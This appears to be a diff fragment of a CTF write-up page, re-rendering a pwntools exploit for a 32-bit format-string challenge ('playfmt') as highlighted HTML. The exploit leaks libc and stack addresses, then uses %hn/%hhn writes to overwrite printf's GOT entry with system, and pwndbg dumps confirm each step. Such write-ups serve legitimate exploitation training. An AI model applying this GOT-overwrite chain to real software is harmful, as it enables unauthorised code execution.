-0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
-0e:0038│      0xffa077f8 ◂— 0x0
-0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-10:0040│      0xffa07800 ◂— 0x1
-11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-12:0048│      0xffa07808 ◂— 0x0
-13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-14:0050│      0xffa07810 ◂— 0x1
-15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
-16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
-17:005c│      0xffa0781c ◂— 0x0
-... ↓
-'''
-gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
-io.send(&quot;..%8$p....%6$p..11111111\0&quot;)
-io.recvuntil(&quot;..&quot;)
-libc.address = int(io.recvuntil(&quot;..&quot;, drop = True), 16) - libc.sym['_IO_2_1_stdout_']
-success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))
-io.recvuntil(&quot;..&quot;)
-stack = int(io.recvuntil(&quot;..&quot;, drop = True), 16) - 0x28
-success(&quot;stack -&gt; {:#x}&quot;.format(stack))
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">Breakpoint *do_fmt+64
+</span><span style="color:#e6db74">pwndbg&gt; x/3s 0x804a060
+</span><span style="color:#e6db74">0x804a060 &lt;buf&gt;:	&#34;..%8$p....%6$p.&#34;...
+</span><span style="color:#e6db74">0x804a06f &lt;buf+15&gt;:	&#34;.11111111&#34;
+</span><span style="color:#e6db74">0x804a079 &lt;buf+25&gt;:	&#34;&#34;
+</span><span style="color:#e6db74">pwndbg&gt; stack 25
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e (&#39;..%8&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
+</span><span style="color:#e6db74">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+</span><span style="color:#e6db74">09:0024│      0xffa077e4 ◂— 0x0
+</span><span style="color:#e6db74">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
+</span><span style="color:#e6db74">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
+</span><span style="color:#e6db74">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">0e:0038│      0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">10:0040│      0xffa07800 ◂— 0x1
+</span><span style="color:#e6db74">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">12:0048│      0xffa07808 ◂— 0x0
+</span><span style="color:#e6db74">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">14:0050│      0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— &#39;./playfmt&#39;
+</span><span style="color:#e6db74">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— &#39;NO_AT_BRIDGE=1&#39;
+</span><span style="color:#e6db74">17:005c│      0xffa0781c ◂— 0x0
+</span><span style="color:#e6db74">... ↓
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *do_fmt+64</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">c&#34;</span>)
+io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;..%8$p....%6$p..11111111</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;..&#34;</span>)
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;..&#34;</span>, drop <span style="color:#f92672">=</span> True), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdout_&#39;</span>]
+success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;..&#34;</span>)
+stack <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;..&#34;</span>, drop <span style="color:#f92672">=</span> True), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x28</span>
+success(<span style="color:#e6db74">&#34;stack -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(stack))
 pause()
 
-'''
-pwndbg&gt; x/3s 0x804a060
-0x804a060 &lt;buf&gt;:	&quot;%30684c%21$hn%1&quot;...
-0x804a06f &lt;buf+15&gt;:	&quot;6c%22$hn2222222&quot;...
-0x804a07e &lt;buf+30&gt;:	&quot;2&quot;
-pwndbg&gt; stack 25
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 ('%306')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
-08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
-09:0024│      0xffa077e4 ◂— 0x0
-0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
-0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
-0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
-0e:0038│      0xffa077f8 ◂— 0x0
-0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-10:0040│      0xffa07800 ◂— 0x1
-11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-12:0048│      0xffa07808 ◂— 0x0
-13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-14:0050│      0xffa07810 ◂— 0x1
-15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
-16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
-17:005c│      0xffa0781c ◂— 0x0
-... ↓
-'''
-payload = &quot;%{}c%{}$hn&quot;.format((stack + 0x1c) &amp; 0xffff, 0x15)
-#  payload += &quot;%{}c%{}$hn&quot;.format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)
-payload += &quot;%{}c%{}$hn&quot;.format(0x10, 0x16)
-payload += '22222222\0'
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">pwndbg&gt; x/3s 0x804a060
+</span><span style="color:#e6db74">0x804a060 &lt;buf&gt;:	&#34;</span><span style="color:#e6db74">%30684c</span><span style="color:#e6db74">%21$hn%1&#34;...
+</span><span style="color:#e6db74">0x804a06f &lt;buf+15&gt;:	&#34;6c%22$hn2222222&#34;...
+</span><span style="color:#e6db74">0x804a07e &lt;buf+30&gt;:	&#34;2&#34;
+</span><span style="color:#e6db74">pwndbg&gt; stack 25
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 (&#39;%306&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
+</span><span style="color:#e6db74">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+</span><span style="color:#e6db74">09:0024│      0xffa077e4 ◂— 0x0
+</span><span style="color:#e6db74">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
+</span><span style="color:#e6db74">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
+</span><span style="color:#e6db74">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">0e:0038│      0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">10:0040│      0xffa07800 ◂— 0x1
+</span><span style="color:#e6db74">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">12:0048│      0xffa07808 ◂— 0x0
+</span><span style="color:#e6db74">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">14:0050│      0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— &#39;./playfmt&#39;
+</span><span style="color:#e6db74">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— &#39;NO_AT_BRIDGE=1&#39;
+</span><span style="color:#e6db74">17:005c│      0xffa0781c ◂— 0x0
+</span><span style="color:#e6db74">... ↓
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%{}c%{}$hn&#34;</span><span style="color:#f92672">.</span>format((stack <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>, <span style="color:#ae81ff">0x15</span>)
+<span style="color:#75715e">#  payload += &#34;%{}c%{}$hn&#34;.format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%{}c%{}$hn&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x16</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;22222222</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
 info(payload)
-io.sendafter(&quot;11111111&quot;, payload)
+io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;11111111&#34;</span>, payload)
 pause()
 
-'''
-pwndbg&gt; x/3s 0x804a060
-0x804a060 &lt;buf&gt;:	&quot;%40976c%57$hn%2&quot;...
-0x804a06f &lt;buf+15&gt;:	&quot;c%59$hn33333333&quot;
-0x804a07e &lt;buf+30&gt;:	&quot;&quot;
-pwndbg&gt; stack 25
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 ('%409')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
-08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
-09:0024│      0xffa077e4 ◂— 0x0
-0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
-0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
-0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
-0e:0038│      0xffa077f8 ◂— 0x0
-0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-10:0040│      0xffa07800 ◂— 0x1
-11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-12:0048│      0xffa07808 ◂— 0x0
-13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-14:0050│      0xffa07810 ◂— 0x1
-15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
-16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
-17:005c│      0xffa0781c ◂— 0x0
-... ↓
-'''
-#  gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
-payload = &quot;%{}c%{}$hn&quot;.format(elf.got['printf'] &amp; 0xffff, 0x39)
-#  payload += &quot;%{}c%{}$hn&quot;.format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)
-payload += &quot;%{}c%{}$hn&quot;.format(2, 0x3b)
-payload += &quot;33333333\0&quot;
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">pwndbg&gt; x/3s 0x804a060
+</span><span style="color:#e6db74">0x804a060 &lt;buf&gt;:	&#34;</span><span style="color:#e6db74">%40976c</span><span style="color:#e6db74">%57$hn%2&#34;...
+</span><span style="color:#e6db74">0x804a06f &lt;buf+15&gt;:	&#34;c%59$hn33333333&#34;
+</span><span style="color:#e6db74">0x804a07e &lt;buf+30&gt;:	&#34;&#34;
+</span><span style="color:#e6db74">pwndbg&gt; stack 25
+</span><span style="color:#e6db74">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 (&#39;%409&#39;)
+</span><span style="color:#e6db74">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
+</span><span style="color:#e6db74">02:0008│      0xffa077c8 ◂— 0x4
+</span><span style="color:#e6db74">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+</span><span style="color:#e6db74">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
+</span><span style="color:#e6db74">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+</span><span style="color:#e6db74">09:0024│      0xffa077e4 ◂— 0x0
+</span><span style="color:#e6db74">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
+</span><span style="color:#e6db74">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
+</span><span style="color:#e6db74">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">0e:0038│      0xffa077f8 ◂— 0x0
+</span><span style="color:#e6db74">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">10:0040│      0xffa07800 ◂— 0x1
+</span><span style="color:#e6db74">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+</span><span style="color:#e6db74">12:0048│      0xffa07808 ◂— 0x0
+</span><span style="color:#e6db74">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
+</span><span style="color:#e6db74">14:0050│      0xffa07810 ◂— 0x1
+</span><span style="color:#e6db74">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
+</span><span style="color:#e6db74">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
+</span><span style="color:#e6db74">17:005c│      0xffa0781c ◂— 0x0
+</span><span style="color:#e6db74">... ↓
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#75715e">#  gdb.attach(io, &#34;b *do_fmt+64\nc&#34;)</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%{}c%{}$hn&#34;</span><span style="color:#f92672">.</span>format(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>, <span style="color:#ae81ff">0x39</span>)
+<span style="color:#75715e">#  payload += &#34;%{}c%{}$hn&#34;.format((elf.got[&#39;printf&#39;] &amp; 0xffff + 2) - (elf.got[&#39;printf&#39;] &amp; 0xffff), 0x3b)</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%{}c%{}$hn&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x3b</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;33333333</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
 info(payload)
-io.sendafter(&quot;22222222&quot;, payload)
+io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;22222222&#34;</span>, payload)
 pause()
 
-'''
-pwndbg&gt; x/3s 0x804a060
-0x804a060 &lt;buf&gt;:	&quot;%211c%11$hhn%31&quot;...
-0x804a06f &lt;buf+15&gt;:	&quot;325c%7$hn444444&quot;...
-0x804a07e &lt;buf+30&gt;:	&quot;44&quot;
-pwndbg&gt; stack 25
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae9
-08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
-09:0024│      0xffa077e4 ◂— 0x0
-0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
-0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
-0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
-0e:0038│      0xffa077f8 ◂— 0x0
-0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-10:0040│      0xffa07800 ◂— 0x1
-11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-12:0048│      0xffa07808 ◂— 0x0
-13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-14:0050│      0xffa07810 ◂— 0x1
-15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d46930
-16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
-17:005c│      0xffa0781c ◂— 0x0
-... ↓
-pwndbg&gt; n
-0x08048540 in do_fmt ()
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-────────────────────────[ REGISTERS ]────────────────────────
- EAX  0x7b38
- EBX  0x0
- ECX  0xffa052a0 ◂— 0x20202020 ('    ')
- EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0
- EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
- ESI  0x1
- EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
- ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
- EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10
-─────────────────────────[ DISASM ]──────────────────────────
-   0x804853b &lt;do_fmt+64&gt;    call   printf@plt &lt;0x80483a0&gt;
-
- ► 0x8048540 &lt;do_fmt+69&gt;    add    esp, 0x10
-   0x8048543 &lt;do_fmt+72&gt;    jmp    do_fmt+6 &lt;0x8048501&gt;
-    ↓
-   0x8048501 &lt;do_fmt+6&gt;     sub    esp, 4
-   0x8048504 &lt;do_fmt+9&gt;     push   0xc8
-   0x8048509 &lt;do_fmt+14&gt;    push   buf &lt;0x804a060&gt;
-   0x804850e &lt;do_fmt+19&gt;    push   0
-   0x8048510 &lt;do_fmt+21&gt;    call   read@plt &lt;0x8048390&gt;
-
-   0x8048515 &lt;do_fmt+26&gt;    add    esp, 0x10
-   0x8048518 &lt;do_fmt+29&gt;    sub    esp, 4
-   0x804851b &lt;do_fmt+32&gt;    push   4
-──────────────────────────[ STACK ]──────────────────────────
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
-────────────────────────[ BACKTRACE ]────────────────────────
- ► f 0  8048540 do_fmt+69
-   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16
-   f 2 f7eb0d60 _IO_2_1_stdout_
-   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18
-   f 4 f7eb03dc __exit_funcs
-   f 5 ffa07810
-   f 6 f7d15276 __libc_start_main+246
-pwndbg&gt; stack 25
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
-08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
-09:0024│      0xffa077e4 ◂— 0x0
-0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
-0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
-0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
-0e:0038│      0xffa077f8 ◂— 0x0
-0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-10:0040│      0xffa07800 ◂— 0x1
-11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-12:0048│      0xffa07808 ◂— 0x0
-13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
-14:0050│      0xffa07810 ◂— 0x1
-15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b30
-16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
-17:005c│      0xffa0781c ◂— 0x0
-... ↓
-pwndbg&gt; got
-
-GOT protection: Partial RELRO | GOT functions: 6
-
-[0x804a00c] read@GLIBC_2.0 -&gt; 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0
-[0x804a010] printf@GLIBC_2.0 -&gt; 0xf7d37b30 (system) ◂— sub    esp, 0xc
-[0x804a014] puts@GLIBC_2.0 -&gt; 0xf7d5c870 (puts) ◂— push   ebp
-[0x804a018] __libc_start_main@GLIBC_2.0 -&gt; 0xf7d15180 (__libc_start_main) ◂— push   ebp
-[0x804a01c] setvbuf@GLIBC_2.0 -&gt; 0xf7d5cff0 (setvbuf) ◂— push   ebp
-[0x804a020] strncmp@GLIBC_2.0 -&gt; 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp
-'''
-#  gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
-payload = &quot;%{}c%{}$hhn&quot;.format(libc.sym['system'] &gt;&gt; 16 &amp; 0xff, 0xb)
-payload += &quot;%{}c%{}$hn&quot;.format((libc.sym['system'] &amp; 0xffff) - (libc.sym['system'] &gt;&gt; 16 &amp; 0xff), 0x7)
-payload += '44444444\0'
+<span style="color:#e6db74">&#39;&#39;&#39;
